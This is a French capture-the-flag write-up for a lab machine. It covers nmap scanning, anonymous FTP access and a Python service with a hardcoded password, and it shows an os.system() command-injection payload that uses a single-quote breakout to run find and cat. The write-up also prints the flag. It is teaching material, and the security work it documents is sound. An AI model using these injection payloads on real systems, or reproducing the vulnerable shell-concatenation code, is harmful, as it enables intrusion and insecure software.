# Write-up — Challenge "Gotham Hotline"

**Cible** : `10.10.0.17`

**Objectif** : Obtenir `user.txt`

**Difficulté** : Easy

**Date** : 21/09/2026

**Techniques utilisées** : Reconnaissance réseau, exploitation FTP anonyme, analyse de code source, injection de commande OS

**Outils utilisés** : nmap, ftp, nc, python3

---

## 1. Reconnaissance réseau (Nmap)

**Commande :**

```bash
nmap -sC -sV -p- -T4 10.10.0.17
```

**Pourquoi :** première étape systématique de tout pentest/CTF -> identifier les services exposés sur la machine cible pour savoir par où entrer.

**Résultat :** 3 ports ouverts

| Port     | Service        | Détails                                                            |
| -------- | -------------- | ------------------------------------------------------------------ |
| 21/tcp   | FTP            | vsftpd 3.0.5 — login anonyme autorisé                              |
| 22/tcp   | SSH            | OpenSSH 10.0p2 Debian                                              |
| 3000/tcp | Service custom | "Gotham Hotline", bannière `🦇 Gotham Hotline: Identify yourself.` |

---

## 2. Exploitation du FTP anonyme

**Faille exploitée :** Accès FTP anonyme non restreint (CWE-284 : Improper Access Control) -> mauvaise configuration de service permettant l'authentification anonyme.

```bash
ftp 10.10.0.17
```

Puis dans la session ftp :

```
Name: anonymous
Password: [vide]
ls -la
get alert.py
cd logs
ls
quit
```

**Pourquoi ça a marché :** le serveur FTP acceptait les connexions anonymes, exposant un script Python (`alert.py`) ainsi qu'un dossier `logs/` avec permissions **777 (writeable par tous)**.

**Fichiers/dossiers trouvés :**

- `alert.py` = code source du service tournant sur le port 3000
- `logs/` = dossier accessible en écriture, contenant `report.txt`

---

## 3. Analyse du code source (`alert.py`)

```python
#!/usr/bin/env python3
import os, socket, time

HOST = "0.0.0.0"
PORT = 3000

def handle_client(conn, addr):
    conn.send("🦇 Gotham Hotline: Identify yourself.\n$> ".encode("utf-8"))
    data = conn.recv(1024).strip().decode()

    if data == "G0th4mN33dsTh3B4t!":
        conn.send(b'Authorized signal. What is the emergency?\n$> ')
        alert_text = conn.recv(1024).strip().decode()
        os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
        conn.send(b"Alert received. Mobilizing Knightfall Protocol.\n")
    else:
        conn.send(b"Unauthorized signal. Transmission terminated.\n")
```

**Failles identifiées :**

| #   | Faille                                                                    | Type / Catégorie                                    |
| --- | ------------------------------------------------------------------------- | --------------------------------------------------- |
| 1   | FTP anonyme + dossier `logs` en écriture pour tous                        | Mauvaise configuration / contrôle d'accès (CWE-284) |
| 2   | Mot de passe applicatif en dur dans le code source                        | Exposition d'identifiants (CWE-798)                 |
| 3   | Concaténation de l'entrée utilisateur dans `os.system()` sans échappement | Injection de commande OS (CWE-78)                   |

Le mot de passe `G0th4mN33dsTh3B4t!` est en clair dans le script, et `alert_text` est inséré tel quel dans une commande shell entre guillemets simples. En injectant un `'` dans notre entrée, on ferme la citation shell en cours et on peut exécuter n'importe quelle commande arbitraire, avant de rouvrir un guillemet simple pour que la syntaxe de la commande `bash -c '...'` reste valide.

---

## 4. Exploitation / Injection de commande OS

### Connexion au service (port 3000)

```bash
nc 10.10.0.17 3000
```

### Authentification

```
G0th4mN33dsTh3B4t!
```

### Payload — localisation du fichier `user.txt`

```
A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B
```

**Pourquoi ça marche :** la commande finale exécutée côté serveur devient :

```bash
bash -c 'echo A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B > /opt/hotline/logs/report.txt'
```

Le `find` s'exécute comme une commande shell indépendante, redirigeant sa sortie vers `report.txt`.

### Récupération du résultat via FTP

```bash
ftp 10.10.0.17
# Name: anonymous
cd logs
get report.txt
quit
```

```bash
cat report.txt
```

**Résultat :**

```
/home/bruce/user.txt
```

---

## 5. Lecture du flag

Nouvelle connexion sur le port 3000 :

```bash
nc 10.10.0.17 3000
```

```
G0th4mN33dsTh3B4t!
```

Payload :

```
A'; cat /home/bruce/user.txt > /opt/hotline/logs/report.txt; echo 'B
```

Récupération via FTP (`get report.txt`), puis :

```bash
cat report.txt
```

**FLAG obtenu :**

```
EPI{1s_8ruc3_W4yn3_84tm4n?}
```

---

## Résumé des failles exploitées

| #   | Faille                                                                     | Type / Catégorie (CWE)                |
| --- | -------------------------------------------------------------------------- | ------------------------------------- |
| 1   | FTP anonyme activé                                                         | Contrôle d'accès défaillant (CWE-284) |
| 2   | Dossier `logs` accessible en écriture pour tous                            | Permissions excessives (CWE-732)      |
| 3   | Mot de passe applicatif en dur, lisible via le code source récupéré en FTP | Exposition d'identifiants (CWE-798)   |
| 4   | Concaténation non filtrée dans `os.system()`                               | Injection de commande OS (CWE-78)     |

---

## Conclusion

- **Accès initial :** exploitation du FTP anonyme -> récupération du code source `alert.py`, révélant un mot de passe applicatif en dur et une vulnérabilité d'injection de commande.
- **Exploitation :** authentification sur le service "Gotham Hotline" (port 3000) puis injection de commande OS via l'entrée `alert_text` non échappée.
- **Flag user :** `EPI{1s_8ruc3_W4yn3_84tm4n?}` obtenu après localisation puis lecture de `/home/bruce/user.txt`.

---

## Evidences

### Flag user.txt

![Flag user.txt](Evidences/Flag%20batman's%20secret.png)
